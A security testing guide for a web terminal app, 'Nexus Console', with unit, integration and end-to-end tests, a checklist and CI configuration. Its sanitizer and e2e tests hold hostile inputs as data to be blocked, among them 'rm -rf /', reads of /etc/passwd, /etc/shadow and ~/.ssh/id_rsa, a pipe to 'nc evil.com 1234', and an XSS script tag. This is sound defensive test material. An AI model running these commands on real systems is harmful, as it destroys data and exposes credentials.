# Security Testing Guide

This guide covers how to test security features in Nexus Console to ensure robust protection against common vulnerabilities.

## Overview

Security testing in Nexus Console covers:
- Command injection prevention
- XSS protection
- Path traversal prevention
- WebSocket security
- Authentication and session management
- Rate limiting and DoS protection

## Running Security Tests

### Quick Start

```bash
# Run all security tests
npm run test:security

# Run specific security test suites
npm run test -- security.test.ts
npm run test -- command-sanitizer.test.ts
npm run test -- websocket-security.test.ts

# Run with coverage
npm run test:security:coverage
```

### Continuous Integration

Security tests run automatically on:
- Every pull request
- Push to main branch
- Nightly security scan
- Before releases

## Test Categories

### 1. Unit Tests for Security Components

#### Command Sanitizer Tests

```typescript
// src/__tests__/security/command-sanitizer.test.ts
import CommandSanitizer from '@security/CommandSanitizer';

describe('CommandSanitizer', () => {
  let sanitizer: CommandSanitizer;
  
  beforeEach(() => {
    sanitizer = new CommandSanitizer();
  });
  
  describe('Command Injection Prevention', () => {
    test('blocks shell metacharacters', () => {
      const dangerous = [
        'ls; rm -rf /',
        'echo && cat /etc/passwd',
        'pwd | nc evil.com 1234',
        'echo $(whoami)',
        'echo `id`'
      ];
      
      dangerous.forEach(cmd => {
        expect(sanitizer.sanitize(cmd)).toBe(false);
      });
    });
    
    test('blocks path traversal', () => {
      const traversals = [
        'cat ../../../etc/passwd',
        'ls ~/.ssh/id_rsa',
        'cd ..; cat secrets.txt'
      ];
      
      traversals.forEach(cmd => {
        expect(sanitizer.sanitize(cmd)).toBe(false);
      });
    });
  });
});
```

#### Content Security Policy Tests

```typescript
// src/__tests__/security/csp.test.ts
import { ContentSecurityPolicy } from '@security/ContentSecurityPolicy';

describe('Content Security Policy', () => {
  test('generates secure CSP headers', () => {
    const csp = new ContentSecurityPolicy();
    const header = csp.buildCSPHeader();
    
    expect(header).toContain("default-src 'self'");
    expect(header).toContain("object-src 'none'");
    expect(header).toContain("base-uri 'self'");
    expect(header).toContain('upgrade-insecure-requests');
  });
  
  test('includes nonce for inline scripts', () => {
    const csp = new ContentSecurityPolicy();
    const nonce = csp.generateNonce();
    const header = csp.buildCSPHeader({}, nonce);
    
    expect(header).toContain(`'nonce-${nonce}'`);
    expect(nonce).toMatch(/^[A-Za-z0-9+/=]{24}$/);
  });
});
```

### 2. Integration Tests

#### WebSocket Security Tests

```typescript
// src/__tests__/integration/websocket-security.test.ts
import { WebSocket } from 'ws';
import { startTestServer } from '../utils/test-server';

describe('WebSocket Security', () => {
  let server: TestServer;
  let wsUrl: string;
  
  beforeAll(async () => {
    server = await startTestServer();
    wsUrl = `ws://localhost:${server.port}/ws`;
  });
  
  test('rejects connections without auth', async () => {
    const ws = new WebSocket(wsUrl);
    
    await expect(waitForOpen(ws)).rejects.toThrow('401');
  });
  
  test('validates message format', async () => {
    const ws = new WebSocket(wsUrl, {
      headers: { 'Authorization': 'Bearer valid-token' }
    });
    
    await waitForOpen(ws);
    
    // Send malformed message
    ws.send('not json');
    
    const error = await waitForMessage(ws);
    expect(error.type).toBe('error');
    expect(error.code).toBe('INVALID_MESSAGE');
  });
  
  test('enforces rate limits', async () => {
    const ws = new WebSocket(wsUrl, {
      headers: { 'Authorization': 'Bearer valid-token' }
    });
    
    await waitForOpen(ws);
    
    // Send many messages rapidly
    for (let i = 0; i < 100; i++) {
      ws.send(JSON.stringify({ type: 'ping' }));
    }
    
    const error = await waitForMessage(ws);
    expect(error.type).toBe('error');
    expect(error.code).toBe('RATE_LIMIT_EXCEEDED');
  });
});
```

#### Authentication Tests

```typescript
// src/__tests__/integration/auth-security.test.ts
describe('Authentication Security', () => {
  test('prevents session fixation', async () => {
    const session1 = await login('user1', 'password1');
    const session2 = await login('user1', 'password1');
    
    // Sessions should be different
    expect(session1.id).not.toBe(session2.id);
  });
  
  test('expires sessions after timeout', async () => {
    const session = await login('user1', 'password1');
    
    // Wait for timeout
    await sleep(SESSION_TIMEOUT + 1000);
    
    // Session should be invalid
    await expect(makeRequest('/api/protected', session.token))
      .rejects.toThrow('401');
  });
  
  test('prevents brute force attacks', async () => {
    // Try many failed logins
    for (let i = 0; i < 10; i++) {
      try {
        await login('user1', 'wrong-password');
      } catch (e) {
        // Expected
      }
    }
    
    // Should be rate limited
    await expect(login('user1', 'correct-password'))
      .rejects.toThrow('429');
  });
});
```

### 3. End-to-End Security Tests

#### XSS Prevention Tests

```typescript
// e2e/security/xss.test.ts
import { test, expect } from '@playwright/test';

test.describe('XSS Prevention', () => {
  test('escapes HTML in terminal output', async ({ page }) => {
    await page.goto('/terminal');
    
    // Try to inject script
    await page.type('.terminal-input', 'echo "<script>alert(1)</script>"');
    await page.keyboard.press('Enter');
    
    // Script should be escaped, not executed
    const alerts = [];
    page.on('dialog', dialog => alerts.push(dialog));
    
    await page.waitForTimeout(1000);
    expect(alerts).toHaveLength(0);
    
    // Output should show escaped HTML
    const output = await page.textContent('.terminal-output');
    expect(output).toContain('&lt;script&gt;');
  });
  
  test('CSP blocks inline scripts', async ({ page }) => {
    const errors = [];
    page.on('pageerror', err => errors.push(err));
    
    await page.goto('/terminal');
    
    // Try to execute inline script
    await page.evaluate(() => {
      const script = document.createElement('script');
      script.textContent = 'console.log("should be blocked")';
      document.body.appendChild(script);
    });
    
    // Should have CSP violation
    const cspError = errors.find(e => 
      e.message.includes('Content Security Policy')
    );
    expect(cspError).toBeDefined();
  });
});
```

#### Command Injection Tests

```typescript
// e2e/security/command-injection.test.ts
test.describe('Command Injection Prevention', () => {
  test('blocks command chaining', async ({ page }) => {
    await page.goto('/terminal');
    await authenticateUser(page);
    
    // Try command injection
    await page.type('.terminal-input', 'ls; cat /etc/passwd');
    await page.keyboard.press('Enter');
    
    // Should show error, not execute
    const output = await page.textContent('.terminal-output');
    expect(output).toContain('Command blocked');
    expect(output).not.toContain('root:');
  });
  
  test('prevents path traversal', async ({ page }) => {
    await page.goto('/terminal');
    await authenticateUser(page);
    
    await page.type('.terminal-input', 'cat ../../../etc/shadow');
    await page.keyboard.press('Enter');
    
    const output = await page.textContent('.terminal-output');
    expect(output).toContain('Access denied');
  });
});
```

### 4. Penetration Testing

#### Automated Security Scanning

```bash
# OWASP ZAP scan
npm run security:zap

# Burp Suite scan (requires Burp Suite Pro)
npm run security:burp

# Custom security scanner
npm run security:scan
```

#### Manual Testing Checklist

```markdown
## Manual Security Testing Checklist

### Authentication
- [ ] Test with expired tokens
- [ ] Test with malformed tokens
- [ ] Test session fixation
- [ ] Test concurrent sessions
- [ ] Test logout functionality

### Input Validation
- [ ] Test with special characters: `<>"'&`
- [ ] Test with null bytes: `\0`
- [ ] Test with unicode: `\u0000`
- [ ] Test with very long inputs
- [ ] Test with binary data

### WebSocket
- [ ] Test connection without auth
- [ ] Test with invalid message types
- [ ] Test with malformed JSON
- [ ] Test message size limits
- [ ] Test rapid reconnection

### File Access
- [ ] Test path traversal: `../../../`
- [ ] Test symbolic links
- [ ] Test hidden files: `.ssh/`
- [ ] Test system files: `/etc/`
- [ ] Test null bytes in paths
```

### 5. Fuzzing Tests

```typescript
// src/__tests__/security/fuzzing.test.ts
import { generateFuzzInputs } from '../utils/fuzzer';

describe('Fuzzing Tests', () => {
  test('command sanitizer handles fuzz inputs', () => {
    const inputs = generateFuzzInputs({
      count: 10000,
      types: ['command', 'unicode', 'binary', 'long']
    });
    
    inputs.forEach(input => {
      expect(() => {
        sanitizer.sanitize(input);
      }).not.toThrow();
    });
  });
  
  test('WebSocket handles fuzz messages', async () => {
    const ws = await createAuthenticatedWebSocket();
    const fuzzMessages = generateFuzzInputs({
      count: 1000,
      types: ['json', 'malformed', 'large']
    });
    
    for (const msg of fuzzMessages) {
      ws.send(msg);
      // Should not crash server
      await waitForResponse(ws);
    }
  });
});
```

### 6. Performance Under Attack

```typescript
// src/__tests__/security/dos.test.ts
describe('DoS Protection', () => {
  test('handles connection floods', async () => {
    const connections = [];
    const start = Date.now();
    
    // Try to create many connections
    for (let i = 0; i < 1000; i++) {
      try {
        connections.push(new WebSocket(wsUrl));
      } catch (e) {
        // Expected to fail after limit
      }
    }
    
    const elapsed = Date.now() - start;
    
    // Should have rate limiting
    expect(connections.length).toBeLessThan(100);
    expect(elapsed).toBeLessThan(5000); // Should fail fast
  });
  
  test('handles large payload attacks', async () => {
    const ws = await createAuthenticatedWebSocket();
    const largePayload = 'x'.repeat(10 * 1024 * 1024); // 10MB
    
    ws.send(JSON.stringify({
      type: 'pty_input',
      data: largePayload
    }));
    
    const response = await waitForMessage(ws);
    expect(response.type).toBe('error');
    expect(response.code).toBe('PAYLOAD_TOO_LARGE');
  });
});
```

## Security Test Reports

### Generating Reports

```bash
# Generate security test report
npm run test:security:report

# Generate coverage report
npm run test:security:coverage

# Generate vulnerability report
npm run audit:report
```

### Report Format

```
Security Test Report
====================
Date: 2024-01-10
Version: 1.0.0

Test Summary
------------
✓ Command Injection: 45/45 passed
✓ XSS Prevention: 23/23 passed  
✓ Authentication: 18/18 passed
✓ WebSocket Security: 32/32 passed
✓ Path Traversal: 15/15 passed
✓ Rate Limiting: 12/12 passed

Vulnerabilities Found: 0
Warnings: 2

Recommendations
---------------
1. Update ws package to latest version
2. Add additional rate limiting for file operations
```

## Continuous Security Monitoring

### Dependency Scanning

```yaml
# .github/workflows/security.yml
name: Security Scan

on:
  schedule:
    - cron: '0 0 * * *' # Daily
  push:
    branches: [main]

jobs:
  scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Run npm audit
        run: npm audit --production
      - name: Run Snyk scan
        uses: snyk/actions/node@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
```

### Runtime Security Monitoring

```typescript
// src/security/monitor.ts
export class SecurityMonitor {
  private events: SecurityEvent[] = [];
  
  logSecurityEvent(event: SecurityEvent): void {
    this.events.push(event);
    
    // Alert on critical events
    if (event.severity === 'critical') {
      this.alertAdmin(event);
    }
    
    // Check for patterns
    this.detectAttackPatterns();
  }
  
  private detectAttackPatterns(): void {
    const recentEvents = this.getRecentEvents(5 * 60 * 1000); // 5 minutes
    
    // Detect brute force
    const failedLogins = recentEvents.filter(e => 
      e.type === 'auth_failure'
    );
    if (failedLogins.length > 10) {
      this.alertAdmin({
        type: 'brute_force_detected',
        severity: 'high'
      });
    }
    
    // Detect command injection attempts
    const injectionAttempts = recentEvents.filter(e =>
      e.type === 'command_blocked'
    );
    if (injectionAttempts.length > 5) {
      this.alertAdmin({
        type: 'injection_attempts_detected',
        severity: 'high'
      });
    }
  }
}
```

## Security Testing Best Practices

### 1. Test Early and Often
- Run security tests in development
- Include in CI/CD pipeline
- Test before each release

### 2. Use Multiple Testing Methods
- Automated scanning
- Manual penetration testing
- Code review
- Dependency analysis

### 3. Keep Tests Updated
- Add tests for new features
- Update for new attack vectors
- Review and refactor regularly

### 4. Document Findings
- Track all vulnerabilities
- Document fixes
- Share learnings with team

### 5. Practice Defense in Depth
- Test multiple security layers
- Assume any layer can fail
- Verify compensating controls

## Resources

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Node.js Security Checklist](https://blog.risingstack.com/node-js-security-checklist/)
- [WebSocket Security](https://tools.ietf.org/html/rfc6455#section-10)
- [Terminal Security](https://www.gnu.org/software/bash/manual/html_node/Shell-Builtin-Commands.html)
